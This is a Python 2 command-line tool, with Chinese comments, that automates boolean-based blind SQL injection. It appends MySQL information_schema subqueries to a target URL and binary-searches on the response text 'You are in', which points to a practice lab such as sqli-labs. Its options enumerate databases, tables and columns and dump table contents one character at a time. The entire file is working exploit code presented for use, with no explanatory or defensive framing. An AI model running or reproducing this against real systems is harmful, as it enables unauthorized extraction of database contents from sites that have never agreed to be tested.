#!/usr/bin/env python
#coding=utf-8

import sys
import requests
import re
import binascii

#sys.argv[1]
# --dbs url
# --tables url -D database
# --columns url -D database -T tablename
# --dump url -D database -T tablename -C columnname

def http_get(url):
    return requests.get(url)
    pass

def dichotomy(sql):  #二分法
    left = 1
    right = 500
    while 1:
        mid = (left + right)/2
        # print mid
        if mid == left:
            return mid
            break
        db_count_url = sql + "%d)--+" % mid
        # print db_count_url
        html = http_get(db_count_url).content
        # print html
        search_flag = re.search("You are in", html)
        if search_flag:
            right = mid
            # print "right:" + str(right)
        else:
            left = mid
            # print "left:" + str(left)

def getAllDabatases(url):
    search_db_num =url + "' and ((select count(schema_name) from information_schema.schemata) < "  #查看数据库总个数
    num = dichotomy(search_db_num)
    # print num
    print ("\t" + u"数据库个数: %d" % num)

    for x in xrange(0,num):
        search_db_len = url + "' and ((select length(schema_name) from information_schema.schemata limit %d,1) < " % x  #看某个数据库名的长度
        db_len = dichotomy(search_db_len)
        print (u"第%d个数据库名的长度: %d" % (x+1,db_len))
        db_name = ''
        for n in xrange(1,db_len+1):
            search_db_name = url + "' and ((select ascii(substr((select schema_name from information_schema.schemata limit %d,1),%d,1))) < " % (x,n)    #查看某个数据库名
            db_name1 = chr(dichotomy(search_db_name))
            # print search_db_name
            db_name = db_name + db_name1
        print "\t" + db_name

def getAlltablesByDb(url, db_name):
    db_name_hex = "0x" + binascii.b2a_hex(db_name)
    search_tab_num = url + "' and ((select count(distinct+table_name) from information_schema.tables where table_schema=%s ) < " % db_name_hex
    num = dichotomy(search_tab_num)
    # print search_tab_num
    print ("\t" + u"表的个数: %d" % num)

    for x in xrange(0,num):
        search_tab_len = url + "' and ((select length(table_name) from information_schema.tables where table_schema=%s limit %d,1) < " % (db_name_hex,x)  #查看某个表名的长度
        tab_len = dichotomy(search_tab_len)
        print (u"第%d个表名的长度: %d" % (x+1,tab_len))
        tab_name = ''
        for n in xrange(1,tab_len+1):
            search_tab_name = url + "' and ((select ascii(substr((select table_name from information_schema.tables where table_schema=%s limit %d,1),%d,1))) < " % (db_name_hex,x,n)    #查看某个表名
            tab_name1 = chr(dichotomy(search_tab_name))
            # print search_db_name
            tab_name = tab_name + tab_name1
        
        print "\t" + tab_name

def getAllcolumnsByTable(url, db_name, tab_name):
    db_name_hex = "0x" + binascii.b2a_hex(db_name)
    tab_name_hex = "0x" + binascii.b2a_hex(tab_name)
    search_column_num = url + "' and ((select count(distinct+column_name) from information_schema.columns where table_schema=%s and table_name=%s ) < " % (db_name_hex,tab_name_hex)
    num = dichotomy(search_column_num)
    print search_column_num
    print ("\t" + u"表中字段的个数: %d" % num)

    for x in xrange(0,num):
        search_column_len = url + "' and ((select length(column_name) from information_schema.columns where table_schema=%s and table_name=%s limit %d,1) < " % (db_name_hex,tab_name_hex,x)  #查看某个字段名的长度
        column_len = dichotomy(search_column_len)
        print (u"第%d个字段名的长度: %d" % (x+1,column_len))
        column_name = ''
        for n in xrange(1,column_len+1):
            search_column_name = url + "' and ((select ascii(substr((select column_name from information_schema.columns where table_schema=%s and table_name=%s limit %d,1),%d,1))) < " % (db_name_hex,tab_name_hex,x,n)    #查看某个字段名
            column_name1 = chr(dichotomy(search_column_name))
            # print search_db_name
            column_name = column_name + column_name1
        
        print "\t" + column_name

def getAllcontent(url, db_name, tab_name, col_name):
    col_name_hex = "0x" + binascii.b2a_hex(col_name)
    search_content_num = url + "' and ((select count(*) from %s.%s ) < " % (db_name,tab_name)
    num = dichotomy(search_content_num)
    # print search_content_num
    print ("\t" + u"表中的行数为：: %d" % num)
    c_num =col_name.split(',')  #传入的字段个数
    c = len(c_num)
    for x in xrange(0,num):
        print "第%d行："% (x+1)
        for y in xrange(0,c):
            search_content_len = url + "' and ((select length(%s) from %s.%s limit %d,1) < " % (c_num[y],db_name,tab_name,x)  #查看某个字段对应内容的长度
            content_len = dichotomy(search_content_len)
            print (u"\t第%d个字段对应内容的长度: %d" % (y+1,content_len))
            content_name = ''
            for n in xrange(1,content_len+1):
                search_content_name = url + "' and ((select ascii(substr((select %s from %s.%s limit %d,1),%d,1))) < " % (c_num[y],db_name,tab_name,x,n)    #查看某个字段名对应内容
                content_name1 = chr(dichotomy(search_content_name))
            # print search_db_name
                content_name = content_name + content_name1
            print "\t%s" % c_num[y] + ':\t' + content_name

def main():
    if sys.argv[1]=='--dbs':
        getAllDabatases(sys.argv[2])
    elif sys.argv[1]=='--tables':
        getAlltablesByDb(sys.argv[2],sys.argv[4])
    elif sys.argv[1]=='--columns':
        getAllcolumnsByTable(sys.argv[2],sys.argv[4],sys.argv[6])
    elif sys.argv[1]=='--dump':
        getAllcontent(sys.argv[2],sys.argv[4],sys.argv[6],sys.argv[8],)
        pass
    else:
        print '我不懂你的参数!'

if __name__ == '__main__':
    main()
